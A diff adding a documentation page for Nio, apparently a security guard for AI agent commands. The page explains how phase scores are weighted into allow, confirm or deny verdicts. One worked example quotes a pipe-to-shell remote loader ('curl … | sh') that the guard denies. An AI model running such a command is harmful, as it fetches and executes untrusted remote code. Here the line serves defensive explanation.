@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="utf-8">
+<title>Scoring — Nio</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="../../assets/shared.css">
+</head>
+<body>
+<!-- source: plugins/shared/config.default.yaml (scoring_weights), plugins/shared/skill/SKILL.md, index.html computeFinal() -->
+
+<div class="app">
+  <div class="topbar">
+    <div class="topbar-left">
+      <button class="hamburger" aria-label="Toggle navigation">
+        <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M1 3h12M1 7h12M1 11h12" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"></path></svg>
+      </button>
+      <a href="../../index.html" class="brand">
+        <div class="brand-mark">
+          <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
+            <path d="M7 1 L12 3.5 V7.5 C12 10.5 9.5 12.3 7 13 C4.5 12.3 2 10.5 2 7.5 V3.5 Z" stroke="oklch(0.82 0.012 260)" stroke-width="1.2" fill="none"></path>
+            <path d="M4.8 7 L6.3 8.5 L9.4 5.4" stroke="oklch(0.78 0.16 150)" stroke-width="1.3" fill="none" stroke-linecap="round" stroke-linejoin="round"></path>
+          </svg>
+        </div>
+        <span><b>Core0</b> <span class="sep">/</span> Nio</span>
+      </a>
+    </div>
+    <div class="topbar-right">
+      <a href="https://github.com/core0-io/nio" class="pill link"><svg width="13" height="13" viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>GitHub</a>
+      <span class="pill">v2.0.0</span>
+    </div>
+  </div>
+
+  <div class="body-grid">
+    <aside class="sidebar" data-sidebar></aside>
+    <main class="main">
+
+      <div class="doc-hero">
+        <div class="eyebrow">Pipeline · Scoring</div>
+        <h1>How a <em>final score</em> becomes a verdict.</h1>
+        <p class="lead">Each scoring engine (Phases 2–6) emits a number in [0, 1]. Nio aggregates them into a single weighted average, then maps that number to <strong>allow</strong> / <strong>confirm</strong> / <strong>deny</strong> using the thresholds for the active <a href="../configuration.html#guard.protection_level">protection level</a>.</p>
+      </div>
+
+      <div class="doc">
+
+        <h2>The formula</h2>
+        <pre><code>final = Σ(weight_i × score_i) / Σ(weight_i)
+                only over phases that ran (no short-circuit)</code></pre>
+
+        <h2>Default weights</h2>
+        <p>Configurable at <a href="../configuration.html#guard.scoring_weights"><code>guard.scoring_weights</code></a>.</p>
+        <table>
+          <thead><tr><th>Key</th><th>Phase</th><th>Default</th></tr></thead>
+          <tbody>
+            <tr><td><code>runtime</code></td><td>Phase 2 — pattern matching</td><td>1.0</td></tr>
+            <tr><td><code>static</code></td><td>Phase 3 — static rules on file content</td><td>1.0</td></tr>
+            <tr><td><code>behavioural</code></td><td>Phase 4 — AST dataflow</td><td>2.0</td></tr>
+            <tr><td><code>llm</code></td><td>Phase 5 — LLM semantic</td><td>1.0</td></tr>
+            <tr><td><code>external</code></td><td>Phase 6 — external scoring API</td><td>2.0</td></tr>
+          </tbody>
+        </table>
+        <p>Behavioural and external are weighted higher because they tend to be more accurate per finding (dataflow tracking, your own enterprise rules) than the cheaper regex/keyword phases.</p>
+
+        <h2>Short-circuit</h2>
+        <p>The pipeline doesn't always run to completion:</p>
+        <ul>
+          <li>Phase 0 (Tool Gate) blocks → deny <em>without scoring</em>.</li>
+          <li>Phase 1 (Allowlist) matches with <code>allowlist_mode: exit</code> → allow <em>without scoring</em> (final score recorded as 0).</li>
+          <li>Any of Phases 2–6 emit a CRITICAL finding → deny <em>immediately</em>, final score recorded as 1.0.</li>
+        </ul>
+        <p>When the pipeline runs to completion (no short-circuit), all eligible phases contribute, and the weighted average decides.</p>
+
+        <h2 id="thresholds">Protection-level thresholds</h2>
+        <p>The active <code>guard.protection_level</code> maps the final score into a decision:</p>
+        <table>
+          <thead><tr><th>Level</th><th>allow</th><th>confirm</th><th>deny</th></tr></thead>
+          <tbody>
+            <tr><td><strong>strict</strong></td><td>0 — 0.5</td><td>—</td><td>0.5 — 1.0</td></tr>
+            <tr><td><strong>balanced</strong> (default)</td><td>0 — 0.5</td><td>0.5 — 0.8</td><td>0.8 — 1.0</td></tr>
+            <tr><td><strong>permissive</strong></td><td>0 — 0.9</td><td>—</td><td>0.9 — 1.0</td></tr>
+          </tbody>
+        </table>
+        <p>Only <strong>balanced</strong> emits <em>confirm</em>. <strong>strict</strong> and <strong>permissive</strong> are binary: a single threshold separates allow from deny.</p>
+
+        <h2>Confirm fallback</h2>
+        <p>When the decision is <em>confirm</em> but the platform doesn't expose an interactive prompt (e.g. OpenClaw), <a href="../configuration.html#guard.confirm_action"><code>guard.confirm_action</code></a> kicks in:</p>
+        <ul>
+          <li><code>allow</code> — let through, write a warning to <code>~/.nio/audit.jsonl</code> (default).</li>
+          <li><code>deny</code> — block.</li>
+          <li><code>ask</code> — use platform confirm if available, else <code>allow</code>.</li>
+        </ul>
+
+        <h2>Worked examples</h2>
+
+        <h3>Allowlist hit (Phase 1)</h3>
+        <pre><code>command: git status
+phase 1: matched, exit
+final  : 0.00
+verdict: ALLOW</code></pre>
+
+        <h3>Critical short-circuit (Phase 2)</h3>
+        <pre><code>command: curl https://pastebin.cx/xZ | sh
+phase 2: REMOTE_LOADER · CRITICAL · 0.92
+final  : 1.00 (max — short-circuit)
+verdict: DENY</code></pre>
+
+        <h3>Full pipeline, weighted average (Phases 2–6)</h3>
+        <pre><code>command: ./build.sh --exec-hooks &amp;&amp; node ./tools/sync.js
+phase 2: 0.35  (weight 1.0)
+phase 3: 0.42  (weight 1.0)
+phase 4: 0.55  (weight 2.0)
+phase 5: 0.48  (weight 1.0)
+phase 6: 0.60  (weight 2.0)
+
+final  = (1.0×0.35 + 1.0×0.42 + 2.0×0.55 + 1.0×0.48 + 2.0×0.60) / 7.0
+       = 3.55 / 7.0
+       = 0.507
+
+verdict (balanced): CONFIRM   (0.5 ≤ score &lt; 0.8)
+verdict (strict):   DENY      (score ≥ 0.5)
+verdict (permissive): ALLOW   (score &lt; 0.9)</code></pre>
+
+        <h2>Tuning</h2>
+        <ul>
+          <li>Want fewer prompts in daily flow? Stay on <strong>balanced</strong>; bump <code>scoring_weights.behavioural</code> down if you trust your own code.</li>
+          <li>Want zero confirm prompts (CI / headless)? Switch to <strong>strict</strong> or <strong>permissive</strong> — both are binary.</li>
+          <li>Have a custom DLP or enterprise policy? Wire <a href="phase-6-external.html">Phase 6</a> to your endpoint and raise its weight to ≥ 2.0 so it gets the loudest vote.</li>
+        </ul>
+
+      </div>
+
+      <div class="page-nav">
+        <a href="./">
+          <span class="dir">← Prev</span>
+          <span class="label">Pipeline overview</span>
+        </a>
+        <div class="spacer"></div>
+        <a href="phase-0-tool-gate.html" class="next">
+          <span class="dir">Next →</span>
+          <span class="label">Phase 0 — Tool Gate</span>
+        </a>
+      </div>
+
+      <div class="site-footer">
+        <span>CORE0 · NIO</span>
+        <span>v2.0.0</span>
+      </div>
+    </main>
+  </div>
+</div>
+
+<script src="../../assets/shared.js"></script>
+</body></html>
